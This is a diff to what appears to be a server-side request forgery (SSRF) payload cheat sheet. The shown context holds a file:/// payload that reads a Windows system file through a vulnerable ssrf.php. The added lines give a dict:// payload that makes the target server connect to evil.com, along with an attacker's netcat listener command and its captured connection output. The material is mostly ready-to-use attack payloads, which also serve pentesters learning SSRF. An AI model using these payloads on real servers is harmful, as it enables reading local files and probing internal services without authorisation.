@@ -103,5 +103,20 @@
     http://example.com/ssrf.php?url=file:///C:/Windows/win.ini
     
  If the server block http request to external sites or whitelist you could simply use below URL schemas to make a request
+ 
+ ## dict:// -
+ 
+  DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
+  
+     http://example.com/ssrf.php?dict://evil.com:1337/
+
+evil.com:$ nc -lvp 1337
+Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 31126)
+CLIENT libcurl 7.40.0
+  
+  
+  
+  
+  
     
     
